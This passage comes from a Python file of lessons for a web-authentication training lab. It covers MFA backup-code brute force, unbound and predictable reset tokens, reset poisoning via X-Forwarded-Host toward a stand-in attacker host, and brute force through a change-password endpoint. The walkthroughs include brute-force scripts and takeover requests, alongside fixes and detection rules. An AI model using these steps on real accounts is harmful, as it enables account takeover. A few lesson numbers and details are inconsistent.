                "           print('backup code =', f'{i:04d}'); break\n   ```\n"
                "6. Follow the redirect to `/account` and read the flag.\n\n"
                "**Why it works** — `verify_backup()` looks the code up, compares it, "
                "and returns. It never touches the `mfa_attempts` table that "
                "`verify()` uses, never sleeps, and never counts a failure. Two "
                "endpoints implementing the same control is the bug: the second one "
                "was not written with the first one's budget in mind."
            ),
            methodology=(
                "Enumerate every path that satisfies or substitutes for a second "
                "factor — backup codes, recovery links, remember-device cookies, "
                "support impersonation, API endpoints, push-approval fallbacks — and "
                "test each for the controls the primary challenge has. Then treat the "
                "unthrottled one as the entry point and size your search to the "
                "keyspace it leaves you."
            ),
            credentials="`carol` / `carol-pw-9911` (first factor only).",
            endpoints=(
                "GET / · POST /login · GET /mfa · POST /verify · GET /verify-backup · "
                "POST /verify-backup · GET /account · GET /healthz"
            ),
            behaviour=(
                "`POST /verify` is throttled to three attempts. `POST /verify-backup` "
                "accepts 4-digit codes with no rate limit, no lockout, no attempt "
                "counter and no cool-off; every wrong code returns the same generic "
                "error."
            ),
            success=(
                "Brute force the 4-digit backup code and reach the account page to "
                "retrieve the flag."
            ),
            remediation=(
                "Use long CSPRNG-generated codes stored hashed and single-use, and "
                "apply the same per-account attempt budget, back-off and lockout to "
                "the backup path as to the primary challenge."
            ),
            detection=(
                "Alert on any backup-code failure or use, and on a session that is "
                "throttled on one challenge succeeding on another."
            ),
            references=[PS_MFA_BACKUP, PS_KNOW],
            lab_family=MFA,
            lab_variant="mfa_backup_guess",
            sort_order=12,
        ),
        # ---------------- 13 ----------------
        lesson(
            "auth-reset-broken-logic",
            "Password reset broken logic — token not bound to the account",
            difficulty="practitioner",
            category="Password Reset",
            summary=(
                "The reset flow checks that a token exists but never that it belongs "
                "to the account being reset, so any valid token resets any account."
            ),
            scenario=(
                "Northwind Retail has just launched self-service password reset. "
                "Recovering your own account works. Take over a different account "
                "without access to that user's mailbox."
            ),
            theory=_theory(
                what=(
                    "**Password reset broken logic.** The reset endpoint validates the token "
                    "and reads the target account from the request. It never checks that the "
                    "token was issued *for that account*. The account identifier is therefore "
                    "attacker-controlled, and any valid token in the system resets any "
                    "password."
                ),
                normal=(
                    "The account is derived from the token, never from the request:\n\n"
                    "```python\n"
                    "@app.post('/reset')\n"
                    "def reset():\n"
                    "    row = consume_token_once(request.form['token'])   # returns account\n"
                    "    if not row:\n"
                    "        return generic_error()\n"
                    "    set_password(row['username'], request.form['password'])\n"
                    "    return 'Password updated.'\n```\n\n"
                    "There is no `user` parameter at all. The token is the only input that "
                    "identifies the account, which is what makes it safe."
                ),
                wrong=(
                    "```python\n"
                    "token = request.form['token']\n"
                    "user  = request.form['user']      # attacker-controlled\n"
                    "if token_exists(token):            # checked, but not scoped to user\n"
                    "    set_password(user, request.form['password'])\n```\n\n"
                    "The token's *existence* is verified; its *ownership* is not. Alice's "
                    "token resets Carol's password."
                ),
                attacker=(
                    "1. Recover your own account first so you hold a valid token — this is "
                    "why self-service reset is the ideal entry point.\n"
                    "2. Note the reset URL contains both a token and a user: "
                    "`/reset?token=1001&user=alice`. Both are parameters.\n"
                    "3. Keep your valid token and change only the `user` parameter to a target "
                    "account:\n"
                    "   ```http\n   POST /reset\n"
                    "   Content-Type: application/x-www-form-urlencoded\n   \n"
                    "   token=1001&user=carol&password=hijacked\n   ```\n"
                    "4. The server confirms the password was updated for `carol`.\n"
                    "5. Sign in as `carol` with your chosen password."
                ),
                why=(
                    "Authorization was performed on the wrong object. The check "
                    "`token_exists(token)` proves *a* token is real; the authorisation "
                    "question is whether it is real **for this account**. Splitting identity "
                    "(from the request) from proof (from the token) is the root cause — the "
                    "token must be the sole source of the account identifier."
                ),
                fix=(
                    "- Derive the account from the token. Remove the `user` parameter "
                    "entirely.\n"
                    "- Store `account_id` inside the token record and consume it atomically "
                    "with the update:\n"
                    "  `UPDATE tokens SET used=1 WHERE token_hash=? AND account_id=? AND "
                    "used=0 AND expires_at>now()` — if that affects zero rows, reject.\n"
                    "- Bind the token to the requesting session as well, for defence in depth.\n"
                    "- Invalidate all outstanding tokens for that account after a reset.\n"
                    "- Re-authenticate factor 1 before allowing a recovery that changes a "
                    "high-value property."
                ),
                detect=(
                    "- Alert when one reset token is presented with more than one distinct "
                    "account identifier — that should be impossible after the fix and is a "
                    "strong pre-fix signal.\n"
                    "- Alert on a reset immediately followed by a successful login for a "
                    "different source/device than the reset request.\n"
                    "- Log the token id, the requested account, and the token's true owner "
                    "server-side so mismatch is visible."
                ),
                real=(
                    "Recovery flows are the most under-tested part of most applications, and "
                    "the 'token + user id in the URL' pattern is common in frameworks where "
                    "the account is a route or form field. Because it needs no access to the "
                    "victim's mailbox, it is rated critical and is a standard bug-bounty "
                    "high-severity find."
                ),
            ),
            objectives=[
                "Identify an account identifier in a reset request that should have come "
                "from the token",
                "Rewrite the reset endpoint so the token is the sole source of the account",
            ],
            hints=[
                "Start by recovering *your own* account through the normal flow. You want a "
                "token that is definitely valid.",
                "Look at the reset link the app gives you. It carries both a token and a "
                "username. Ask which of those the server should be trusting.",
                "Submit the reset form with your own token but set the user field to "
                "`carol`. The server checks the token exists, never that it belongs to carol.",
                "Then log in as `carol` with the password you just set and read the flag.",
            ],
            solution=(
                "**Walkthrough**\n\n"
                "1. Trigger a reset for your own account so you hold a valid token. The lab "
                "ships tokens `1001` (alice), `1002` (bob), `1003` (carol); recovering yours "
                "shows the flow works.\n"
                "2. Observe the reset URL shape: `/reset?token=1001&user=alice`. The `user` "
                "value is a request parameter, and the server reads it as the account to "
                "modify.\n"
                "3. Swap only the account, keeping your own valid token:\n"
                "   ```http\n   POST /reset\n"
                "   Content-Type: application/x-www-form-urlencoded\n   \n"
                "   token=1001&user=carol&password=hijacked-2026\n   ```\n"
                "   Response: `Password updated for carol.`\n"
                "4. The server's check is `SELECT * FROM tokens WHERE token = ?` — token "
                "`1001` exists, so it proceeds to set the password for whatever `user` was "
                "supplied. `1001` belongs to alice, but carol's password was changed.\n"
                "5. Sign in as `carol` with `hijacked-2026` to obtain the flag from the "
                "account page.\n\n"
                "**Why it works** — the code verifies the token's *existence* but never its "
                "*ownership*, and takes the target account from the request. Deriving the "
                "account from the token record and removing the `user` parameter fixes it."
            ),
            methodology=(
                "Recover a valid token for an account you own, then vary the account "
                "identifier supplied to the reset endpoint while keeping the token constant. "
                "A successful reset of a different account proves the binding check is "
                "missing."
            ),
            credentials=(
                "Target: `carol`. Recovery flow ships valid tokens for `alice` (1001), "
                "`bob` (1002), `carol` (1003)."
            ),
            endpoints=(
                "GET / · POST /forgot · GET /reset · POST /reset · "
                "GET /login · POST /login · GET /account · "
                "GET /change · POST /change · GET /healthz"
            ),
            behaviour=(
                "`POST /reset` verifies that the supplied token exists but not that it was "
                "issued for the supplied `user`, so any valid token resets any account."
            ),
            success=(
                "Reset `carol`'s password using a token issued for a different account, then "
                "sign in as `carol` with it and retrieve the flag from `/account`."
            ),
            remediation=(
                "Derive the account from the token record, remove the `user` parameter, and "
                "consume the token atomically with the password update."
            ),
            detection=(
                "Alert when a reset token is presented with a different account identifier "
                "than the one it was issued for, and on a reset followed by a login from a new "
                "source."
            ),
            references=[PS_RESET_LOGIC, PS_RECOVERY],
            lab_family=RESET,
            lab_variant="reset_broken_logic",
            sort_order=13,
        ),
        # ---------------- 12 ----------------
        lesson(
            "auth-reset-poisoning-middleware",
            "Password reset poisoning via middleware (host header)",
            difficulty="practitioner",
            category="Password Reset",
            summary=(
                "The reset email builds its link from an `X-Forwarded-Host` header the "
                "attacker controls, so the victim receives a link to the attacker's host."
            ),
            scenario=(
                "Northwind Retail's reset email is under your control — you can request a "
                "reset for an account. Demonstrate that you can influence the host of the "
                "link the victim receives."
            ),
            theory=_theory(
                what=(
                    "**Password reset poisoning via Host header.** The application builds absolute "
                    "URLs for outgoing email from the incoming request's `Host` / "
                    "`X-Forwarded-Host` value. An attacker who can inject that header when they "
                    "trigger the reset causes the victim to receive a reset link pointing at the "
                    "attacker's domain. When the victim clicks it, the token is delivered to the "
                    "attacker."
                ),
                normal=(
                    "Absolute URLs in email come from server configuration, never from the "
                    "request:\n\n"
                    "```python\n"
                    "BASE_URL = config['public_base_url']        # e.g. https://app.example.com\n"
                    "link = f\"{BASE_URL}/reset?token={raw}\"\n```\n\n"
                    "The request headers are not consulted at all. Behind a proxy this is the "
                    "correct pattern precisely *because* the proxy's host header is not trusted."
                ),
                wrong=(
                    "```python\n"
                    "base = request.headers.get('X-Forwarded-Host', 'app.example.com')\n"
                    "proto = request.headers.get('X-Forwarded-Proto', 'https')\n"
                    "link = f'{proto}://{base}/reset?token={raw}'\n```\n\n"
                    "The fallback is harmless; the problem is that the header is honoured at "
                    "all. Any client can set it."
                ),
                attacker=(
                    "1. Note that you can trigger a reset for an account by submitting its "
                    "email to `/forgot` — you do not need mailbox access.\n"
                    "2. Send that request with an injected host header:\n"
                    "   ```http\n"
                    "   POST /forgot\n"
                    "   Host: app.example.com\n"
                    "   X-Forwarded-Host: evil.attacker-domain.example\n"
                    "   Content-Type: application/x-www-form-urlencoded\n   \n"
                    "   email=carol@northwind-retail.test\n   ```\n"
                    "3. Read the email the lab displays. The reset link now points at "
                    "`evil.attacker-domain.example` — the victim's token would be sent there.\n"
                    "4. Extract the token from that poisoned link. It is the victim's real "
                    "token, now in your hands.\n"
                    "5. Feed it back into the *real* reset endpoint to take over the account."
                ),
                why=(
                    "The server treated a request header as authoritative configuration. Email "
                    "links are a special case: they are rendered outside the application's "
                    "origin, so a poisoned host escapes the same-origin protections that would "
                    "normally make host-header injection hard to exploit, and it is acted on "
                    "later and elsewhere by the victim."
                ),
                fix=(
                    "- Build all absolute URLs from a **server-configured** base URL. Never "
                    "read the host from a request header.\n"
                    "- If a forwarded host is genuinely needed behind a proxy, use it only "
                    "when `remote_addr` is a trusted proxy, and validate it against an "
                    "allow-list of expected hosts.\n"
                    "- Consider **relative** links in email where the client can resolve them, "
                    "or embed the host in a configuration value per environment.\n"
                    "- Add a regression test asserting the reset email's host never changes "
                    "regardless of request headers.\n"
                    "- Treat `X-Forwarded-Host` as untrusted at the edge: strip it and set your "
                    "own canonical value."
                ),
                detect=(
                    "- Log the generated reset link's host and compare it to the configured "
                    "base URL; alert on any mismatch.\n"
                    "- Alert on requests to `/forgot` (and any email-generating endpoint) that "
                    "carry `X-Forwarded-Host` / `X-Original-Host` from an untrusted path.\n"
                    "- Log the resolved base URL on every outbound email and sample it in "
                    "monitoring."
                ),
                real=(
                    "Reset poisoning is one of the highest-impact, low-complexity findings in "
                    "bug bounty. It is common wherever an app is containerised or behind a "
                    "load balancer and the framework provides a helper that prefers the "
                    "request's host. The impact is critical because the victim performs the "
                    "final step themselves, so it evades most user-reporting and looks like a "
                    "legitimate email."
                ),
            ),
            objectives=[
                "Influence the host of an emailed reset link using a forwarded-host header",
                "Explain why email links are the highest-impact place for host injection",
            ],
            hints=[
                "You can trigger a reset email for any address — that is the entry point. The "
                "question is whether the link inside that email is fixed by the server or "
                "influenced by your request.",
                "Add an `X-Forwarded-Host` header (and try `X-Original-Host`, `X-Host`) to the "
                "`/forgot` request. The lab displays the generated email, so you can see the "
                "effect immediately.",
                "The lab prints the delivered mail. When your injected host appears in the link, "
                "copy the token value out of it — that is the victim's real token.",
                "Now take that token to the genuine reset endpoint and set a new password for "
                "`carol`, then sign in.",
            ],
            solution=(
                "**Walkthrough**\n\n"
                "1. Trigger a reset for the target, injecting the host header:\n"
                "   ```http\n   POST /forgot\n"
                "   Host: northwind-retail.test\n"
                "   X-Forwarded-Host: evil.attacker-domain.example\n"
                "   Content-Type: application/x-www-form-urlencoded\n   \n"
                "   email=carol@northwind-retail.test\n   ```\n"
                "2. The response renders the delivered mail, which contains:\n"
                "   ```\n   Subject: Reset your Northwind password\n\n"
                "   Use the link below within 30 minutes:\n"
                "   http://evil.attacker-domain.example/reset?token=1003&user=carol\n   ```\n"
                "   The host is the one you injected. In a real attack the victim clicks this "
                "and the token arrives at your server.\n"
                "3. Extract the token from the poisoned link (`1003` here) and redeem it "
                "against the **real** host:\n"
                "   ```http\n   POST /reset\n   Host: northwind-retail.test\n"
                "   Content-Type: application/x-www-form-urlencoded\n   \n"
                "   token=1003&user=carol&password=hijacked-2026\n   ```\n"
                "   Response: `Password updated for carol.`\n"
                "4. Sign in as `carol` with the new password to retrieve the flag.\n\n"
                "**Why it works** — "
                "`build_link()` reads `request.headers.get('X-Forwarded-Host', ...)` and "
                "uses it verbatim as the base of the emailed URL. The server should use its "
                "configured public base URL; a forwarded host is only trustworthy when the "
                "immediate peer is a proxy you control and the header is validated against an "
                "allow-list."
            ),
            methodology=(
                "Request a password-reset email while injecting `X-Forwarded-Host` (and "
                "related headers), and inspect the generated link in the delivered mail. If "
                "the host is attacker-controlled, extract the token and redeem it against the "
                "genuine endpoint."
            ),
            credentials=(
                "No credentials needed. Trigger the flow with "
                "`carol@northwind-retail.test`."
            ),
            endpoints=(
                "GET / · POST /forgot · GET /reset · POST /reset · "
                "GET /login · POST /login · GET /account · GET /healthz"
            ),
            behaviour=(
                "`POST /forgot` builds the emailed reset link using the `X-Forwarded-Host` "
                "and `X-Forwarded-Proto` request headers, and displays the resulting mail."
            ),
            success=(
                "Obtain a reset link whose host is the one you injected, and extract the "
                "victim's reset token from it."
            ),
            remediation=(
                "Build emailed absolute URLs from a server-configured base URL; never read "
                "the host from a request header."
            ),
            detection=(
                "Log the host used in outbound reset emails and alert when it differs from "
                "the configured base URL; also alert on forwarding headers sent to "
                "email-generating endpoints."
            ),
            references=[PS_RESET_LOGIC, PS_RECOVERY],
            lab_family=RESET,
            lab_variant="reset_poisoning_mw",
            sort_order=14,
        ),
        # ---------------- 13 ----------------
        lesson(
            "auth-reset-change-bruteforce",
            "Password brute force via the password-change endpoint",
            difficulty="practitioner",
            category="Password Reset",
            summary=(
                "Login is rate-limited, but the change-password endpoint verifies the "
                "current password with no limit — so brute force moves there."
            ),
            scenario=(
                "Northwind Retail rate-limits the login form, so `carol` is safe there. "
                "Find an endpoint that re-checks the current password and use it to "
                "brute force instead."
            ),
            theory=_theory(
                what=(
                    "**Rate-limit bypass via an alternate credential-checking path.** Many "
                    "applications re-verify the current password on sensitive actions — "
                    "change password, change email, disable MFA, view recovery codes. Those "
                    "endpoints are frequently written later, guarded by different middleware, and "
                    "ship without the throttling applied to the login form. Rate limiting that "
                    "exists on one path is not a property of the application; it is a property "
                    "of that path."
                ),
                normal=(
                    "Every endpoint that accepts a current password uses the same verification "
                    "helper *and* the same throttling:\n\n"
                    "```python\n"
                    "def require_current_password(user, supplied):\n"
                    "    rate_limit(f'pwdcheck:{user.id}', limit=5, window=300)\n"
                    "    if not verify(supplied, user.password_hash):\n"
                    "        raise InvalidCredentials\n"
                    "```\n\n"
                    "and sensitive actions additionally require a recent authentication or "
                    "step-up challenge."
                ),
                wrong=(
                    "```python\n"
                    "@app.post('/api/change')\n"
                    "def change():\n"
                    "    if data['current'] == user.password:   # plain compare, no limiter\n"
                    "        set_password(data['new']); return {'ok': True}\n"
                    "    return {'ok': False}\n```\n\n"
                    "The login form has a rate limiter; this handler does not. The application "
                    "still requires the current password — the attacker just has to guess it in a "
                    "place nobody is counting."
                ),
                attacker=(
                    "1. Map the endpoints that ask for a current password. In this lab: "
                    "`POST /change` and the JSON variant `POST /api/change`.\n"
                    "2. Confirm the login form is throttled: repeated wrong passwords to "
                    "`/login` get blocked. Then send the same guesses to `/api/change` — no "
                    "block.\n"
                    "3. Automate a password list against the unthrottled endpoint:\n"
                    "   ```python\n"
                    "   for pw in wordlist:\n"
                    "       r = httpx.post(BASE + '/api/change',\n"
                    "                        json={'current': pw, 'new': 'hijacked'})\n"
                    "       if r.json().get('ok'):\n"
                    "           print('password =', pw); break\n"
                    "   ```\n"
                    "4. On success, sign in with the discovered password and read the flag.\n"
                    "5. The same technique generalises: change email, disable MFA, view "
                    "backup codes, and API-key rotation are all credential-checking endpoints."
                ),
                why=(
                    "The security control was attached to a route rather than to the "
                    "operation. Because the *operation* — verifying a current password — is "
                    "implemented in several places, and only one of them is throttled, the "
                    "control is trivially relocated by the attacker. Controls belong to the "
                    "operation, and should be centralised so they cannot drift."
                ),
                fix=(
                    "- Centralise current-password verification in one helper that always "
                    "applies the same throttling and lockout.\n"
                    "- Rate-limit per account across **all** credential-checking endpoints "
                    "(login, change, MFA disable, recovery), not per route.\n"
                    "- Require recent authentication or step-up MFA for sensitive actions.\n"
                    "- Compare with a constant-time hash verify, never a plain equality check.\n"
                    "- Inventory every endpoint that accepts a current password and confirm "
                    "each one is throttled; add a CI test that fails when a new one is not."
                ),
                detect=(
                    "- Count failed current-password verifications per account across *all* "
                    "endpoints, not just login, and alert on the aggregate.\n"
                    "- Alert when failures for one account are concentrated on change-password "
                    "or MFA-management endpoints rather than login.\n"
                    "- Alert on a successful password change followed by a login with the old "
                    "password elsewhere."
                ),
                real=(
                    "This is a recurring finding because the sensitive-action endpoints are "
                    "usually added by a different engineer, later, under time pressure, and "
                    "are protected by 'must be logged in' rather than by a rate limit. Any "
                    "endpoint that re-verifies a secret is a candidate."
                ),
            ),
            objectives=[
                "Find credential-checking endpoints other than the login form",
                "Explain why throttling must be attached to the operation, not the route",
            ],
            hints=[
                "The login form is protected. Look for other places the application asks you "
                "to prove you know your current password.",
                "This lab has a 'Change password' page at `/change` and a JSON endpoint at "
                "`POST /api/change`. Try wrong passwords against the login form, then against "
                "these.",
                "Send a password list to `POST /api/change` with a JSON body "
                "`{\"current\": \"<guess>\", \"new\": \"hijacked\"}`. A response of "
                "`{\"ok\": true}` is the match.",
                "Then sign in as `carol` using the discovered password. The lab's password is "
                "in a common-password list.",
            ],
            solution=(
                "**Walkthrough**\n\n"
                "1. Confirm login is throttled: repeated `POST /login` failures eventually "
                "return a lockout.\n"
                "2. The change-password flow also asks for the current password:\n"
                "   ```http\n   POST /api/change\n"
                "   Content-Type: application/json\n   \n"
                "   {\"current\": \"guess\", \"new\": \"hijacked-2026\"}\n   ```\n"
                "   Response: `{\"ok\": false, \"error\": \"incorrect\"}` with **no** rate "
                "limit, no lockout, no delay — the handler does a plain comparison and returns.\n"
                "3. Brute force it:\n"
                "   ```python\n"
                "   import httpx\n"
                "   for pw in ['password','123456','qwerty','letmein','welcome',\n"
                "               'admin','iloveyou','monkey','dragon','carol-pw-9911']:\n"
                "       r = httpx.post(BASE + '/api/change',\n"
                "                        json={'current': pw, 'new': 'hijacked-2026'})\n"
                "       if r.json().get('ok'):\n"
                "           print('current password =', pw); break\n"
                "   ```\n"
                "4. Once it returns `{\"ok\": true}`, the password has been changed. Sign in "
                "at `/login` as `carol` with `hijacked-2026` and read the flag.\n\n"
                "**Why it works** — the login form is rate-limited, but `/api/change` verifies "
                "the current password with a plain equality check and no attempt budget. The "
                "control was applied to the route instead of the operation, so the attacker "
                "simply moved to the unthrottled route. Centralising the verification — and "
                "its throttling — fixes it."
            ),
            methodology=(
                "Inventory every endpoint that re-verifies the current password (change "
                "password, change email, disable MFA, reveal recovery codes) and probe each "
                "for the absence of throttling, then brute force against the one that is "
                "unguarded."
            ),
            credentials="Target: `carol`. You do not have her password — recovering it is the "
            "exercise, and sign-in is rate limited so the guesses have to go somewhere else.",
            endpoints=(
                "GET / · GET /login · POST /login · GET /account · "
                "GET /change · POST /change · POST /api/change · GET /healthz"
            ),
            behaviour=(
                "`/login` is rate-limited, but `POST /api/change` verifies the current "
                "password with no rate limit, lockout, or delay."
            ),
            success=(
                "Brute force the current password through the change-password endpoint, "
                "change it, and sign in as `carol` to retrieve the flag."
            ),
            remediation=(
                "Centralise current-password verification in one throttled helper applied to "
                "every sensitive-action endpoint."
            ),
            detection=(
                "Aggregate failed current-password checks per account across all endpoints "
                "and alert on the total, not per route."
            ),
            references=[PS_CHANGE, PS_BRUTE, PS_KNOW],
            lab_family=RESET,
            lab_variant="reset_change_bruteforce",
            sort_order=15,
        ),
        # ---------------- 14 ----------------
        lesson(
            "auth-reset-poisoning-complete",
            "Completing the takeover via password reset poisoning",
            difficulty="expert",
            category="Password Reset",
            summary=(
                "Chain the poisoned reset link into a completed account takeover: "
                "steal the victim's token from the mail, then redeem it."
            ),
            scenario=(
                "You have already shown that the reset email's host is attacker-controlled. "
                "Now complete the attack: obtain `carol`'s reset token from the poisoned "
                "link and take over the account."
            ),
            theory=_theory(
                what=(
                    "**Full password reset poisoning chain.** Lab 12 stopped at proof that the "
                    "emailed link's host is attacker-controlled. This lab completes the chain: the "
                    "attacker captures the victim's reset token from the poisoned link and "
                    "redeems it against the genuine site. Poisoning is only a *means*; the "
                    "*impact* is full account takeover of whoever was targeted."
                ),
                normal=(
                    "The chain is impossible when the link host is fixed and the token is bound "
                    "to the request that triggered it:\n\n"
                    "```\n"
                    "attacker triggers reset  ->  mail goes to victim, link = real host\n"
                    "victim clicks link        ->  token stays on the real origin\n"
                    "attacker has no token     ->  chain breaks\n```\n\n"
                    "Add token binding to the session and a short expiry and the chain is broken "
                    "even if a link leaks through a mail archive or a Referer."
                ),
                wrong=(
                    "```python\n"
                    "base = request.headers.get('X-Forwarded-Host', 'northwind-retail.test')\n"
                    "link = f'http://{base}/reset?token={raw}'\n```\n\n"
                    "The token is in the URL of a link whose host the attacker chose. When the "
                    "victim clicks, the browser sends the full URL — token included — to the "
                    "attacker's host."
                ),
                attacker=(
                    "1. Trigger a reset for the victim with an injected "
                    "`X-Forwarded-Host: evil.attacker-domain.example`.\n"
                    "2. The delivered mail (shown in the lab) now contains:\n"
                    "   ```\n"
                    "   http://evil.attacker-domain.example/reset?token=<VICTIM_TOKEN>&user=carol\n"
                    "   ```\n"
                    "   That token is the victim's genuine reset token — in a real attack it "
                    "would be delivered to the attacker's request logger.\n"
                    "3. Copy the token and the target account out of the poisoned link.\n"
                    "4. Redeem it against the **real** host:\n"
                    "   ```http\n   POST /reset\n"
                    "   Content-Type: application/x-www-form-urlencoded\n   \n"
                    "   token=<VICTIM_TOKEN>&user=carol&password=hijacked-2026\n   ```\n"
                    "5. Sign in as `carol` with the new password. Account taken over."
                ),
                why=(
                    "The attacker never needed to intercept the victim's traffic or compromise "
                    "their mailbox. They caused a legitimate, correctly formatted email from the "
                    "legitimate domain to contain a link to their own host. The victim's own "
                    "browser delivered the token to the attacker. That is why this class is "
                    "rated critical: the trusted channel is used as the delivery mechanism, so "
                    "it bypasses user suspicion, mail filtering heuristics, and most reporting."
                ),
                fix=(
                    "- Build the emailed URL from a server-configured base URL (see the previous "
                    "lab). This alone breaks the chain.\n"
                    "- As defence in depth, bind the reset token to the requesting session and "
                    "issue a *fresh* token when the link is opened.\n"
                    "- Keep tokens short-lived (15–60 min) and single-use.\n"
                    "- Require re-authentication of factor 1 before completing a recovery.\n"
                    "- Notify the user that a recovery was requested, from a separate channel, "
                    "and log it for the user to see.\n"
                    "- Set `Referrer-Policy: no-referrer` on the reset page and avoid "
                    "third-party subresources on it, so the token cannot leak sideways."
                ),
                detect=(
                    "- Log the host used in every outbound reset email; alert on any deviation "
                    "from the configured base URL. This is the single best detection for this "
                    "class.\n"
                    "- Alert on requests to email-generating endpoints carrying forwarding "
                    "headers from untrusted sources.\n"
                    "- Alert on a reset request whose requesting source is not the "
                    "account's usual geography, and on a reset followed by a login from a new "
                    "device.\n"
                    "- Provide a user-visible history of recovery actions."
                ),
                real=(
                    "Password reset poisoning is consistently one of the most highly rated "
                    "authentication findings, and it is a favourite of bug bounty researchers "
                    "because the exploit is two requests and a link click. It has caused real "
                    "incidents in large SaaS platforms, where the poisoned link is used to "
                    "take over executive accounts. Because the email is genuine and correctly "
                    "signed, mail security products generally do not flag it."
                ),
            ),
            objectives=[
                "Complete the reset-poisoning chain from header injection to account takeover",
                "Explain why the genuine, correctly formatted email is what makes this critical",
            ],
            hints=[
                "This is the payoff lab for the previous one. The poisoned link is the "
                "delivery mechanism; your goal is the token inside it.",
                "Trigger `/forgot` for `carol` with an injected `X-Forwarded-Host`. The lab "
                "renders the delivered mail — read the link it contains.",
                "Copy the `token=` value from that poisoned link. It is the victim's real token, "
                "even though the host in the link is yours.",
                "Now send `POST /reset` to the genuine host with that token and set a new "
                "password, then sign in as `carol`.",
            ],
            solution=(
                "**Walkthrough — completing the chain**\n\n"
                "1. Poison the link:\n"
                "   ```http\n   POST /forgot\n"
                "   X-Forwarded-Host: evil.attacker-domain.example\n"
                "   Content-Type: application/x-www-form-urlencoded\n   \n"
                "   email=carol@northwind-retail.test\n   ```\n"
                "2. Read the delivered mail in the response. It contains:\n"
                "   ```\n"
                "   http://evil.attacker-domain.example/reset?token=1003&user=carol\n"
                "   ```\n"
                "   In a real engagement the victim clicks this and their browser sends the "
                "whole URL to the attacker's host, handing over the token. The lab prints it "
                "for you so the final step is reproducible.\n"
                "3. Redeem the token against the genuine site:\n"
                "   ```http\n   POST /reset\n   Host: northwind-retail.test\n"
                "   Content-Type: application/x-www-form-urlencoded\n   \n"
                "   token=1003&user=carol&password=hijacked-2026\n   ```\n"
                "   Response: `Password updated for carol.`\n"
                "4. Sign in:\n"
                "   ```http\n   POST /login\n\n"
                "   username=carol&password=hijacked-2026\n   ```\n"
                "   → the account page and the flag.\n\n"
                "**Why the chain works** — the emailed URL is built from an attacker-supplied "
                "host, so the token is delivered outside the real origin; the token is then "
                "accepted by the real endpoint with no session binding and a long life. "
                "Fixing the base URL breaks the chain at step 2; session binding and a short "
                "expiry break it as defence in depth."
            ),
            methodology=(
                "Inject a forwarded-host header when triggering a reset, capture the token "
                "from the poisoned link, then redeem that token against the genuine reset "
                "endpoint to complete the takeover."
            ),
            credentials=(
                "No credentials needed. Trigger the flow with "
                "`carol@northwind-retail.test`."
            ),
            endpoints=(
                "GET / · POST /forgot · GET /reset · POST /reset · "
                "GET /login · POST /login · GET /account · GET /healthz"
            ),
            behaviour=(
                "`POST /forgot` builds the emailed reset link from the `X-Forwarded-Host` "
                "header and prints the resulting mail, exposing the target's reset token inside "
                "the attacker-controlled link."
            ),
            success=(
                "Extract the victim's reset token from the poisoned link and use it to set a "
                "new password, then sign in as `carol` to retrieve the flag."
            ),
            remediation=(
                "Use a server-configured base URL for emailed links, bind reset tokens to the "
                "requesting session, shorten their lifetime, and notify users of recovery "
                "requests out of band."
            ),
            detection=(
                "Log and alert on any mismatch between the host used in an outbound reset "
                "email and the configured base URL; also alert on forwarding headers sent to "
                "email-generating endpoints."
            ),
            references=[PS_RESET_LOGIC, PS_RECOVERY],
            lab_family=RESET,
            lab_variant="reset_poisoning_mw",
            sort_order=16,
        ),
        # ---------------- 17 ----------------
        lesson(
            "auth-reset-predictable",
            "Predictable password reset tokens",
            difficulty="practitioner",
            category="Password Reset",
            summary=(
                "Reset tokens are sequential integers and are accepted without being "
                "checked, so the next one is guessable without seeing any email."
            ),
            scenario=(
                "Northwind Retail's account recovery issues predictable tokens. Take "
                "over `carol`'s account without ever receiving her reset email."
            ),
            theory=_theory(
                what=(
                    "**Predictable reset tokens.** The token is the entire security of "
                    "the recovery flow — whoever holds it can set the password. When "
                    "tokens are generated by a counter, a timestamp truncated to the "
                    "second, a short random string, or a hash of a public value, they "
                    "are not secrets: they are arithmetic. Combined with a handler "
                    "that accepts a token without confirming it was ever issued, or "
                    "without binding it to the account, the flow hands over any "
                    "password reset in the system."
                ),
                normal=(
                    "A reset token must be unguessable, single-use, time-limited, and "
                    "bound to the account it was issued for:\n\n"
                    "```python\n"
                    "token = secrets.token_urlsafe(32)        # 256 bits, CSPRNG\n"
                    "store(token_hash, username, expires_at=now() + timedelta(minutes=30),\n"
                    "      used=False)\n"
                    "```\n\n"
                    "And the consuming side must check *all* of it:\n\n"
                    "```python\n"
                    "@app.post('/reset')\n"
                    "def reset():\n"
                    "    row = store.consume(request.form['token'])   # single use\n"
                    "    if not row or row.expires_at < now():\n"
                    "        return generic_error()\n"
                    "    if not hmac.compare_digest(row.token_hash, hash_of(supplied)):\n"
                    "        return generic_error()\n"
                    "    set_password(row.username, request.form['password'])\n"
                    "    invalidate_all_sessions(row.username)\n"
                    "```\n\n"
                    "The token is delivered only to the registered address, and the "
                    "response is identical whether or not that address exists."
                ),
                wrong=(
                    "```python\n"
                    "token = str(next_counter())            # 1001, 1002, 1003 ...\n"
                    "```\n\n"
                    "```python\n"
                    "if token.isdigit() and int(token) >= 1001:   # never looks the token up\n"
                    "    set_password(request.form['user'], request.form['password'])\n"
                    "```\n\n"
                    "Two independent failures. The token space is a counter, and the "
                    "handler performs no lookup at all — so it accepts a token that "
                    "was never issued, for an account it was never issued to, and it "
                    "does not care that no reset was ever requested."
                ),
                attacker=(
                    "1. Request a reset for an account you own or for a throwaway "
                    "address and read the delivered link. It contains "
                    "`token=1001&user=...`.\n"
                    "2. Note the structure: three digits, and the neighbouring "
                    "accounts are 1001, 1002, 1003. This is a counter, not a random "
                    "string.\n"
                    "3. Target a higher-value account — `carol`, the administrator — "
                    "and submit a neighbouring token. `GET /reset?token=1003&user=carol` "
                    "renders a form addressed to `carol`.\n"
                    "4. Submit any plausible integer; the handler never checks the "
                    "token table:\n"
                    "   ```http\n   POST /reset\n   "
                    "Content-Type: application/x-www-form-urlencoded\n   \n"
                    "   token=4821&user=carol&password=hijacked\n   ```\n"
                    "5. `Password updated for carol.` is the proof. Enumerate tokens "
                    "in a range to map how far the space extends and which accounts "
                    "are reachable."
                ),
                why=(
                    "The token is treated as an identifier rather than as the secret "
                    "it is. Because the server never looks the value up, the only "
                    "thing standing between an attacker and a password reset is a "
                    "guess — and the guess space is a counter that starts at 1001."
                ),
                fix=(
                    "- Generate tokens with `secrets.token_urlsafe(32)` or equivalent; "
                    "never a counter, timestamp, or hash of public data.\n"
                    "- **Store the token**, look it up, and check it. A reset handler "
                    "that never queries its own token store is the bug to look for.\n"
